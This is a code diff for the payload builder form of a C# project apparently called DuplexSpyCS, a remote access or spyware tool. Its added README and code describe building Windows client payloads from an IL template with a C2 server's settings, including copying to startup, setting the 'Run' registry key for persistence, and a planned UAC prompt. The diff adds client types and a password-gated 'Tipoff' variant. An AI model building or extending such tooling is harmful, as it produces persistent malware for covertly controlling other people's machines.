@@ -18,6 +18,35 @@ namespace DuplexSpyCS
 {
     public partial class frmBuild : Form
     {
+        /* .o0o.---------------[ README ]---------------.o0o.
+         * Payload builder
+         * 
+         * Introduction:
+         * Build Windows payload with specified parameters.
+         * 
+         * Type of payload:
+         * 1. Merged: All in one payload, run it directly.
+         * 2. Small: Need to be invoked.
+         * 3. Tipoff: Need password to be invoked.
+         * 
+         * How it works:
+         * Read *.il file, replace parameters, compile it using "ilasm.exe".
+         * 
+         * Done:
+         * - winClient48
+         * - MessageBox
+         * - Copy to specified directory.
+         * - Copy to startup.
+         * - Set "Run" registry.
+         * 
+         * Todo:
+         * - UAC prompt
+         * - Small
+         * - Tipoff
+         * 
+         * .o0o.---------------[ README ]---------------.o0o.
+         */
+
         private IniManager ini_manager = C2.ini_manager;
         private Image imgExeIcon;
 
@@ -36,7 +65,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "information" log.
+        /// Print "information" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsInfo(string msg)
@@ -49,7 +78,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "OK" log.
+        /// Print "OK" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsOK(string msg)
@@ -62,7 +91,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "Error" log.
+        /// Print "Error" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsErr(string msg)
@@ -184,7 +213,7 @@ namespace DuplexSpyCS
         /// <param name="output_file">Output exe file.</param>
         /// <param name="srcContent">IL assembly code.</param>
         /// <returns></returns>
-        bool CompileFromIL(string output_file, string srcContent)
+        bool CompileFromIL(string szType, string output_file, string srcContent)
         {
             /* How it work:
              * Write srcContent(Payload) into temp file,
@@ -210,7 +239,7 @@ namespace DuplexSpyCS
                 {
                     Application.StartupPath,
                     "Payload",
-                    "Merged",
+                    szType,
                     Path.GetRandomFileName(),
                 });
 
@@ -279,6 +308,7 @@ namespace DuplexSpyCS
                 dwTimeout = (int)numericUpDown2.Value, //Client connection timeout(ms).
                 dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).
                 dwInterval = (int)numericUpDown4.Value, //Send inform interval(ms).
+                szPrefix = textBox2.Text,
 
                 //Install
                 bCopyDir = checkBox1.Checked,
@@ -299,7 +329,7 @@ namespace DuplexSpyCS
             if (!ValidateBuildConfig(buildConfig))
                 return;
 
-            buildConfig.clntType = ClientType.Merged;
+            buildConfig.clntType = (ClientType)Enum.Parse(typeof(ClientType), comboBox2.Text);
 
             //Client source file path.
             string szIL = Path.Combine(
@@ -330,6 +360,7 @@ namespace DuplexSpyCS
                     .Replace("[INTERVAL]", buildConfig.dwInterval.ToString())
                     .Replace("[TIMEOUT]", buildConfig.dwTimeout.ToString()) //ms
                     .Replace("[RETRY]", buildConfig.dwRetry.ToString()) //ms
+                    .Replace("[PREFIX]", buildConfig.szPrefix)
 
                     //Install
                     .Replace("[IS_CP_DIR]", buildConfig.bCopyDir ? "true" : "false")
@@ -347,16 +378,20 @@ namespace DuplexSpyCS
                     .Replace("[MB_BTN]", buildConfig.msgboxConfig.button.ToString())
                     .Replace("[MB_ICON]", buildConfig.msgboxConfig.icon.ToString())
 
+                    //Tipoff
+                    .Replace("[SHA256_PASSWORD]", textBox7.Text)
+
                     //Other
                     .Replace("-nan(ind)", "0x7FF8000000000000")
+                    //.Replace("inf", "3.40282347E+38")
                 );
 
-                string szDirName = Path.GetDirectoryName(filePath);
-                string szFileName = Path.GetFileNameWithoutExtension(filePath);
-                string szPdbFile = $"{szDirName}\\{szFileName}.pdb";
+                string szDirName = Path.GetDirectoryName(filePath); //Directory path.
+                string szFileName = Path.GetFileNameWithoutExtension(filePath); //Filename without extension.
+                string szPdbFile = $"{szDirName}\\{szFileName}.pdb"; //Debug file.
                 bool bExists = File.Exists(szPdbFile);
 
-                if (CompileFromIL(filePath, szPayload))
+                if (CompileFromIL(buildConfig.clntType.ToString(), filePath, szPayload))
                 {
                     logsOK("Compile successfully.");
 
@@ -366,6 +401,7 @@ namespace DuplexSpyCS
                         File.Delete(szPdbFile);
                     }
 
+                    //Print message.
                     logsOK("Build client successfully: " + filePath);
                     logsOK("*******************************************");
                     logsOK("Finished");
